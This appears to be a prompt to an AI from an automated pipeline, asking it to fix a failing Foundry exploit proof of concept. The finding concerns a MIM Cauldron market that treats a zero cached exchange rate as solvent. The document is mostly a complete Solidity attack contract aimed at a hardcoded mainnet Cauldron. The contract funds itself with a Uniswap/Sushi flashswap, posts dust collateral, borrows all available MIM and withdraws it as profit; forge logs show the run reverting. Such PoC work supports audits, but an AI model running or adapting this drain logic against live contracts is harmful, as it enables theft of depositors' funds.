You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Freshly initialized markets are immediately borrowable at a zero exchange rate
- claim: `init()` sets the collateral/oracle fields but never seeds or validates `exchangeRate`. Until `updateExchangeRate()` succeeds at least once, the cached rate stays at its zero default, and every solvency check in `borrow()`, `removeCollateral()` and `cook()` trusts that zero value. With `_exchangeRate == 0`, `_isSolvent()` reduces the debt side of the comparison to zero, so any borrower with nonzero collateral is treated as solvent regardless of debt size.
- impact: The first borrower in a newly created market can post dust collateral and drain all MIM available in the Cauldron before anyone performs a successful oracle update. If the configured oracle keeps returning `updated == false` or otherwise never seeds a nonzero cached rate, the market can remain permanently unliquidatable while bad debt accumulates.
- exploit_paths: ["Deploy or clone a new Cauldron -> fund it with MIM -> attacker adds minimal collateral -> attacker calls `borrow()` before any successful `updateExchangeRate()` -> solvency check passes at `exchangeRate == 0` -> attacker drains available MIM", "Deploy a market with an oracle that never returns an updated rate -> cached `exchangeRate` remains zero -> attacker repeatedly borrows against tiny collateral and cannot be liquidated using the same zero-rate solvency logic"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ICauldronLike {
    function addCollateral(address to, bool skim, uint256 share) external;
    function removeCollateral(address to, uint256 share) external;
    function borrow(address to, uint256 amount) external returns (uint256 part, uint256 share);
    function exchangeRate() external view returns (uint256);
    function updateExchangeRate() external returns (bool updated, uint256 rate);
    function userBorrowPart(address user) external view returns (uint256);
    function userCollateralShare(address user) external view returns (uint256);
    function totalCollateralShare() external view returns (uint256);
    function collateral() external view returns (address);
    function magicInternetMoney() external view returns (address);
    function bentoBox() external view returns (address);
}

interface IBentoBoxLike {
    function balanceOf(IERC20Minimal token, address account) external view returns (uint256 share);
    function deposit(
        IERC20Minimal token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external payable returns (uint256 amountOut, uint256 shareOut);
    function toAmount(IERC20Minimal token, uint256 share, bool roundUp) external view returns (uint256 amount);
    function toShare(IERC20Minimal token, uint256 amount, bool roundUp) external view returns (uint256 share);
    function withdraw(
        IERC20Minimal token,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    error NoLiveZeroRateMarket();
    error NoTargetLiquidity();
    error UnsupportedFlashswap();
    error UnexpectedFlashPair(address caller);
    error UnexpectedFlashSender(address sender);
    error ZeroRateNotObserved();
    error NoCollateralAdded();
    error NoDebtRecorded();
    error InsufficientFlashRepayment(uint256 required, uint256 available);

    address internal constant TARGET = 0xbb02A884621FB8F5BFd263A67F58B65df5b090f3;
    IERC20Minimal internal constant MIM = IERC20Minimal(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    uint256 internal constant DUST_SHARE = 1;
    uint256 internal constant ROUTE_BUFFER_MIM = 1e15;

    uint256 internal _profitAmount;

    bool public hypothesisValidated;
    bool public usedFlashLoan;
    bool public zeroRatePersistsAfterUpdate;
    address public bentoBoxAddress;
    address public collateralToken;
    address public activePair;
    address public activeRouter;
    uint256 public borrowedAmount;
    uint256 public withdrawnAmount;
    uint256 public removedCollateralAmount;

    constructor() {}

    function executeOnOpportunity() external {
        _resetState();

        uint256 balanceBefore = _safeBalanceOf(address(MIM), address(this));
        ICauldronLike cauldron = _liveCauldron();
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        uint256 marketMimShare = bento.balanceOf(MIM, TARGET);
        if (marketMimShare <= DUST_SHARE) revert NoTargetLiquidity();

        if (collateralToken == address(MIM)) {
            _exploitWithDirectSkim(cauldron, bento, marketMimShare);
        } else {
            _exploitWithMimFlashswap(cauldron, bento, marketMimShare);
        }

        uint256 balanceAfter = _safeBalanceOf(address(MIM), address(this));
        if (balanceAfter > balanceBefore) {
            _profitAmount = balanceAfter - balanceBefore;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender != activePair) revert UnexpectedFlashPair(msg.sender);
        if (sender != address(this)) revert UnexpectedFlashSender(sender);

        uint256 flashAmount = amount0 > 0 ? amount0 : amount1;
        if (flashAmount == 0) revert UnsupportedFlashswap();

        ICauldronLike cauldron = ICauldronLike(TARGET);
        IBentoBoxLike bento = IBentoBoxLike(bentoBoxAddress);

        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();

        uint256 collateralAmount = _minimumCollateralAmount(bento, collateralToken);

        // exploit_paths[0] and [1] already happened historically on-chain for the live target:
        // the market was deployed and funded before this transaction. We only add the minimal
        // attacker-side funding needed to satisfy the "nonzero collateral" precondition.
        _buyExactCollateralFromMim(collateralAmount);

        uint256 collateralBalance = _safeBalanceOf(collateralToken, address(this));
        _approveIfNeeded(collateralToken, bentoBoxAddress, collateralBalance);
        (, uint256 collateralShare) = bento.deposit(
            IERC20Minimal(collateralToken),
            address(this),
            address(this),
            collateralBalance,
            0
        );
        if (collateralShare == 0) revert NoCollateralAdded();

        cauldron.addCollateral(address(this), false, collateralShare);
        if (cauldron.userCollateralShare(address(this)) < collateralShare) revert NoCollateralAdded();

        // exploit_paths[2]: borrow while the cached exchange rate is still zero.
        _borrowAvailableMim(cauldron, bento, bento.balanceOf(MIM, TARGET));

        // exploit_paths[3]: the same zero-rate solvency logic lets the attacker remove the
        // entire dust collateral position after debt has already been recorded.
        cauldron.removeCollateral(address(this), collateralShare);
        removedCollateralAmount = bento.toAmount(IERC20Minimal(collateralToken), collateralShare, false);

        bento.withdraw(IERC20Minimal(collateralToken), address(this), address(this), 0, collateralShare);
        _sellAllCollateralBackToMim();
        _withdrawAllMim(bento);
        _observePersistentZeroRate(cauldron);

        uint256 repayment = _flashRepayAmount(flashAmount);
        uint256 available = _safeBalanceOf(address(MIM), address(this));
        if (available < repayment) revert InsufficientFlashRepayment(repayment, available);
        _safeTransfer(address(MIM), msg.sender, repayment);

        hypothesisValidated = true;
    }

    function profitToken() external pure returns (address) {
        return address(MIM);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _liveCauldron() internal returns (ICauldronLike cauldron) {
        cauldron = ICauldronLike(TARGET);

        try cauldron.magicInternetMoney() returns (address liveMim) {
            if (liveMim != address(MIM)) revert NoLiveZeroRateMarket();
        } catch {
            revert NoLiveZeroRateMarket();
        }

        try cauldron.exchangeRate() returns (uint256 rate) {
            if (rate != 0) revert NoLiveZeroRateMarket();
        } catch {
            revert NoLiveZeroRateMarket();
        }

        try cauldron.bentoBox() returns (address liveBento) {
            bentoBoxAddress = liveBento;
        } catch {
            revert NoLiveZeroRateMarket();
        }

        try cauldron.collateral() returns (address liveCollateral) {
            collateralToken = liveCollateral;
        } catch {
            revert NoLiveZeroRateMarket();
        }
    }

    function _exploitWithDirectSkim(ICauldronLike cauldron, IBentoBoxLike bento, uint256 marketMimShare) internal {
        uint256 skimAvailable = marketMimShare - cauldron.totalCollateralShare();
        if (skimAvailable < DUST_SHARE) revert NoTargetLiquidity();

        // exploit_paths[0] and [1] already occurred before the fork block. Because the live market's
        // collateral token is MIM itself, the attacker can satisfy the minimal-collateral step by
        // skimming a single unfenced MIM share that is already sitting on the market.
        cauldron.addCollateral(address(this), true, DUST_SHARE);
        if (cauldron.userCollateralShare(address(this)) < DUST_SHARE) revert NoCollateralAdded();

        // exploit_paths[2]: borrow the market's MIM before any successful exchange-rate seed.
        _borrowAvailableMim(cauldron, bento, marketMimShare);

        // exploit_paths[3]: remove the dust collateral under the same zero-rate solvency check.
        cauldron.removeCollateral(address(this), DUST_SHARE);
        removedCollateralAmount = bento.toAmount(MIM, DUST_SHARE, false);

        _withdrawAllMim(bento);
        _observePersistentZeroRate(cauldron);
        hypothesisValidated = true;
    }

    function _exploitWithMimFlashswap(ICauldronLike, IBentoBoxLike bento, uint256) internal {
        (address pair, address router) = _selectMimFlashPairAndRouter(collateralToken);
        if (pair == address(0) || router == address(0)) revert NoLiveZeroRateMarket();

        uint256 collateralAmount = _minimumCollateralAmount(bento, collateralToken);
        uint256 mimNeededForCollateral = _quoteMimForExactCollateral(router, collateralToken, collateralAmount);
        uint256 flashAmount = mimNeededForCollateral + ROUTE_BUFFER_MIM;

        activePair = pair;
        activeRouter = router;
        usedFlashLoan = true;

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        if (token0 == address(MIM)) {
            IUniswapV2PairLike(pair).swap(flashAmount, 0, address(this), hex"01");
        } else if (token1 == address(MIM)) {
            IUniswapV2PairLike(pair).swap(0, flashAmount, address(this), hex"01");
        } else {
            revert UnsupportedFlashswap();
        }

        delete activePair;
        delete activeRouter;
    }

    function _borrowAvailableMim(ICauldronLike cauldron, IBentoBoxLike bento, uint256 marketMimShare) internal {
        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();

        uint256 borrowShare = marketMimShare - DUST_SHARE;
        uint256 amountToBorrow = bento.toAmount(MIM, borrowShare, false);
        (uint256 part,) = cauldron.borrow(address(this), amountToBorrow);
        borrowedAmount = amountToBorrow;
        if (part == 0 || cauldron.userBorrowPart(address(this)) == 0) revert NoDebtRecorded();
        if (cauldron.exchangeRate() != 0) revert ZeroRateNotObserved();
    }

    function _withdrawAllMim(IBentoBoxLike bento) internal {
        uint256 attackerShare = bento.balanceOf(MIM, address(this));
        if (attackerShare != 0) {
            (uint256 amountOut,) = bento.withdraw(MIM, address(this), address(this), 0, attackerShare);
            withdrawnAmount += amountOut;
        }
    }

    function _observePersistentZeroRate(ICauldronLike cauldron) internal {
        try cauldron.updateExchangeRate() returns (bool updated, uint256 rate) {
            zeroRatePersistsAfterUpdate = !updated && rate == 0 && cauldron.exchangeRate() == 0;
        } catch {
            zeroRatePersistsAfterUpdate = false;
        }
    }

    function _minimumCollateralAmount(IBentoBoxLike bento, address token) internal view returns (uint256 amount) {
        amount = bento.toAmount(IERC20Minimal(token), DUST_SHARE, true);
        if (amount == 0) amount = 1;
    }

    function _selectMimFlashPairAndRouter(address collateral)
        internal
        view
        returns (address bestPair, address bestRouter)
    {
        address[2] memory factories = [SUSHISWAP_FACTORY, UNISWAP_V2_FACTORY];
        address[2] memory routers = [SUSHISWAP_ROUTER, UNISWAP_V2_ROUTER];
        address[4] memory quotes = [WETH, DAI, USDC, USDT];
        uint256 bestReserve;

        for (uint256 i = 0; i < factories.length; ++i) {
            if (!_supportsMimCollateralRoute(factories[i], collateral)) continue;

            for (uint256 j = 0; j < quotes.length; ++j) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(address(MIM), quotes[j]);
                if (pair == address(0) || pair.code.length == 0) continue;

                uint256 reserve = _pairReserveOf(pair, address(MIM));
                if (reserve > bestReserve) {
                    bestReserve = reserve;
                    bestPair = pair;
                    bestRouter = routers[i];
                }
            }
        }
    }

    function _supportsMimCollateralRoute(address factory, address collateral) internal view returns (bool) {
        if (collateral == address(MIM)) return true;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateral) != address(0)) return true;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), WETH) == address(0)) return false;
        if (collateral == WETH) return true;
        return IUniswapV2FactoryLike(factory).getPair(WETH, collateral) != address(0);
    }

    function _quoteMimForExactCollateral(address router, address collateral, uint256 amountOut)
        internal
        view
        returns (uint256)
    {
        if (collateral == address(MIM)) return amountOut;

        address factory = router == SUSHISWAP_ROUTER ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateral) != address(0)) {
            address[] memory directPath = new address[](2);
            directPath[0] = address(MIM);
            directPath[1] = collateral;
            return IUniswapV2RouterLike(router).getAmountsIn(amountOut, directPath)[0];
        }

        address[] memory viaWethPath = new address[](3);
        viaWethPath[0] = address(MIM);
        viaWethPath[1] = WETH;
        viaWethPath[2] = collateral;
        return IUniswapV2RouterLike(router).getAmountsIn(amountOut, viaWethPath)[0];
    }

    function _buyExactCollateralFromMim(uint256 amountOut) internal {
        if (collateralToken == address(MIM)) return;

        address router = activeRouter;
        _approveIfNeeded(address(MIM), router, _safeBalanceOf(address(MIM), address(this)));

        address factory = router == SUSHISWAP_ROUTER ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateralToken) != address(0)) {
            address[] memory directPath = new address[](2);
            directPath[0] = address(MIM);
            directPath[1] = collateralToken;
            IUniswapV2RouterLike(router).swapTokensForExactTokens(
                amountOut,
                _safeBalanceOf(address(MIM), address(this)),
                directPath,
                address(this),
                block.timestamp
            );
            return;
        }

        address[] memory viaWethPath = new address[](3);
        viaWethPath[0] = address(MIM);
        viaWethPath[1] = WETH;
        viaWethPath[2] = collateralToken;
        IUniswapV2RouterLike(router).swapTokensForExactTokens(
            amountOut,
            _safeBalanceOf(address(MIM), address(this)),
            viaWethPath,
            address(this),
            block.timestamp
        );
    }

    function _sellAllCollateralBackToMim() internal {
        if (collateralToken == address(MIM)) return;

        uint256 collateralBalance = _safeBalanceOf(collateralToken, address(this));
        if (collateralBalance == 0) return;

        address router = activeRouter;
        _approveIfNeeded(collateralToken, router, collateralBalance);

        address factory = router == SUSHISWAP_ROUTER ? SUSHISWAP_FACTORY : UNISWAP_V2_FACTORY;
        if (IUniswapV2FactoryLike(factory).getPair(address(MIM), collateralToken) != address(0)) {
            address[] memory directPath = new address[](2);
            directPath[0] = collateralToken;
            directPath[1] = address(MIM);
            IUniswapV2RouterLike(router).swapExactTokensForTokens(
                collateralBalance,
                0,
                directPath,
                address(this),
                block.timestamp
            );
            return;
        }

        address[] memory viaWethPath = new address[](3);
        viaWethPath[0] = collateralToken;
        viaWethPath[1] = WETH;
        viaWethPath[2] = address(MIM);
        IUniswapV2RouterLike(router).swapExactTokensForTokens(
            collateralBalance,
            0,
            viaWethPath,
            address(this),
            block.timestamp
        );
    }

    function _pairReserveOf(address pair, address token) internal view returns (uint256 reserve) {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (IUniswapV2PairLike(pair).token0() == token) {
            reserve = reserve0;
        } else if (IUniswapV2PairLike(pair).token1() == token) {
            reserve = reserve1;
        }
    }

    function _flashRepayAmount(uint256 borrowedAmount_) internal pure returns (uint256) {
        return ((borrowedAmount_ * 1000) / 997) + 1;
    }

    function _resetState() internal {
        _profitAmount = 0;
        hypothesisValidated = false;
        usedFlashLoan = false;
        zeroRatePersistsAfterUpdate = false;
        bentoBoxAddress = address(0);
        collateralToken = address(0);
        activePair = address(0);
        activeRouter = address(0);
        borrowedAmount = 0;
        withdrawnAmount = 0;
        removedCollateralAmount = 0;
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 balance) {
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Minimal.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            balance = abi.decode(data, (uint256));
        }
    }

    function _safeAllowance(address token, address owner, address spender) internal view returns (uint256 allowance_) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Minimal.allowance.selector, owner, spender)
        );
        if (ok && data.length >= 32) {
            allowance_ = abi.decode(data, (uint256));
        }
    }

    function _approveIfNeeded(address token, address spender, uint256 requiredAmount) internal {
        if (_safeAllowance(token, address(this), spender) >= requiredAmount) return;
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, type(uint256).max);
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 6.83s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 40847)
Traces:
  [40847] FlawVerifierTest::testExploit()
    ├─ [300] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
    ├─ [2582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [28245] FlawVerifier::executeOnOpportunity()
    │   ├─ [582] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2985] 0xbb02A884621FB8F5BFd263A67F58B65df5b090f3::magicInternetMoney() [staticcall]
    │   │   ├─ [319] 0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2::magicInternetMoney() [delegatecall]
    │   │   │   └─ ← [Return] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
    │   │   └─ ← [Return] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3
    │   ├─ [2584] 0xbb02A884621FB8F5BFd263A67F58B65df5b090f3::exchangeRate() [staticcall]
    │   │   ├─ [2418] 0x4a9Cb5D0B755275Fd188f87c0A8DF531B0C7c7D2::exchangeRate() [delegatecall]
    │   │   │   └─ ← [Return] 387970202315884682 [3.879e17]
    │   │   └─ ← [Return] 387970202315884682 [3.879e17]
    │   └─ ← [Revert] NoLiveZeroRateMarket()
    └─ ← [Revert] exploit call reverted

Backtrace:
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 24.88ms (469.68µs CPU time)

Ran 1 test suite in 43.06ms (24.88ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 40847)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
